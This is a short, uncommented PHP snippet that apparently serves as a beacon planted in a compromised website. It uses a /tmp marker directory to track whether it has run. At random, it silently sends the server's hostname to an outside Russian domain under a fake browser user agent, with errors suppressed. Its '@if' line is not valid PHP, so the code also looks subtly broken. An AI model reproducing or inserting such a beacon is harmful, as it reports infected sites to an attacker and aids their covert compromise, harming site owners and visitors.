<?php
$d=$_SERVER['SERVER_NAME'];
@if(filesize('/tmp/conf'.$d)) { } else {
@mkdir('/tmp/conf'.$d);
$sayi = rand(1,3);
if($sayi == 1) {
  $curl3 = curl_init();
 curl_setopt_array($curl3, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'https://imbiz.ru/data/data.php?s='.$d.'',
    CURLOPT_USERAGENT => 'chrome'
]);
 $resp3 = curl_exec($curl3);
 curl_close($curl3);	
}} ?>	
